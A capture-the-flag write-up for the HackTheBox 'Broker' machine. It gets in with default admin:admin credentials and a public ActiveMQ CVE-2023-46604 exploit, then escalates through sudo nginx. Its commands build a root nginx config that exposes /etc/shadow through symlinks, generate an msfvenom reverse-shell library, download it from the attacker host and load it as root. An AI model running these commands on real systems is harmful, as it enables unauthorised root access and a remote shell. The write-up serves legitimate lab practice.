# HTB: Broker

Hi, the reason why I'm making this writeup is because I think I did the privesc of this box in a unique and easier way than others. Instead of writing an SSH key to `/root/.ssh/id_rsa`, or dealing with logs and poisoning, you can just use nginx's `-g` flag to run a shared library.

This writeup won't walk you straight to the solution. I will be mentioning some of the rabbit holes I went down. If you don't want that, then just read the **bold** lines.

### Foothold

- **We're welcomed with an http basic authentication request. Trying `admin:admin` suprisingly works. (I really wasn't expecting that.)**
  
- **It's running ActiveMQ**
  
- **It leaks the version on `http://10.10.11.243/admin/`**
  
- Looking at my outdated `searchsploit`, I couldn't find anything. And considering this is HackTheBox, this shouldn't be the vector right?
  
- I try enumerating port 1883
  

```bash
mosquitto_sub -h 10.10.11.243 -t '#' -v
```

- There is no traffic. So I try making some by browsing the webpage and sending messages from `http://10.10.11.243/admin/send.jsp`. I can only read what I sent. It doesn't help.
  
- So, I kept enumerating other ports, looking at the Nmap output. But they got me nowhere.
  
- **I finally decided to actually look for CVE's. I search on Google for `activemq cve`**
  
- **I was greated with `CVE-2023-46604`, searching for `CVE-2023-46604 github` we find this Python script `https://github.com/evkl1d/CVE-2023-46604`. Written a week before the box's release.**
  
- **We run the exploit and get into the box.**
  

### Privesc

- **My immediate thought was to run `sudo -l` (probably because it's the easiest one. And if there is something you can run using `sudo`, it has the highest chance of involving in the privesc)**
  
- **We see `/usr/sbin/nginx`. Hmm, GTFOBins? Nothing. Nginx runs commands on startup? Nope. File read-write? Didn't think so. What can we do now?**
  
- I run `nginx -h`, find nothing at the first glance, I search the web for something I could use, but no. I look at suid binaries, run `linpeas` but there is nothing I can use.

![nginx help](https://github.com/Dogru-Isim/CTFSolutions/blob/main/HackTheBox/Linux/Easy/Broker/images/nginx_help.png?raw=true)
  
- It's now time to look deeper into the `nginx` vector.
  
- **I see that there is a `-c` option. I can use this to use a custom configuration file.**
  
- **I can also use `-s stop` to stop and restart nginx so we don't disturb others with our endless web-servers**
  
- **Lets create a new configuration file. We'll also need the "default" file from `/etc/nginx/sites-available/default`**
  
- **Now, lets modify them to run our web server as `root` on 4443. And our path will be /home/activemq/.work. I also want to remove things that we surely won't need. (comments, includes from /etc/nginx/*)**
  

```new-config.config
user root;
worker_processes auto;
pid /run/nginx.pid;
#include /etc/nginx/modules-enabled/*.conf;

events {
        worker_connections 768;
}

http {

        sendfile on;
        tcp_nopush on;
        types_hash_max_size 2048;

        include /etc/nginx/mime.types;
        default_type application/octet-stream;

        ssl_prefer_server_ciphers on;

        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;

        gzip on;

        #include /etc/nginx/conf.d/*.conf;
        #include /etc/nginx/sites-enabled/*;
        include /home/activemq/.work/new-default;
}
```

```new-default
server {
    listen 4443;
    server_name    nothing.broker.htb
    root /home/activemq/.work/
    location / {}
}
```

- **Now lets run it to see if it works,**
  

```bash
activemq@broker:~/.work$ sudo nginx -c new-config.config 

nginx: [emerg] open() "/usr/share/nginx/new-config.config" failed (2: No such file or directory)
```

- Hmm, it's looking for it in `/usr/share/nginx/` lets specify the current directory.
  

```bash
activemq@broker:~/.work$ sudo nginx -c ./new-config.config 
nginx: [emerg] open() "/usr/share/nginx/./new-config.config" failed (2: No such file or directory)
```

- **Meh, maybe we do some directory traversal,**
  

```bash
activemq@broker:~/.work$ sudo nginx -c ../../../../home/activemq/.work/new-config.config 
```

- **Haha, it worked!**
  
- **I know you can't run php natively on nginx. But I still try writing a webshell to our webroot. Appearently, when you do that you get to download the file. So I set-up a symlink to `/etc/shadow` and `/root/root.txt`. And browse to them.**
  

```bash
activemq@broker:~/.work$ ln -s /root/root.txt flag
activemq@broker:~/.work$ sudo nginx -c ../../../../home/activemq/.work/new-config.config 
```

- **We can get the flag this way. But this is not optimal is it?**
  
- **After reading some Nginx docs: [Command-line parameters](http://nginx.org/en/docs/switches.html), I realize that we can run `-g` with a limited amount of options such as `pid $path` and etc. They are called `global configuration directives`. global- What?**
  
- **I don't know a lot about the others but one of them is actually useful to us: `load_module`**
  
- **So, my goal now is to download an `msfvenom` generated shared library ".so", and run it using `-g load_module priv.so`. DAMN I love this shit.**
  

```bash
Local:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=$local_ip LPORT=8443 -f elf-so > priv.so
$ python3 -m http.server
```

```bash
Remote:
$ wget http://10.10.14.176:8000/priv.so
$ sudo nginx -c ../../../../home/activemq/.work/new-config.config -g 'load_module priv.so'
```

- I hope you didn't forget setting up `multi/handler`
  
- And there is our shell

![Root Shell](https://github.com/Dogru-Isim/CTFSolutions/blob/main/HackTheBox/Linux/Easy/Broker/images/root_shell.png?raw=true)
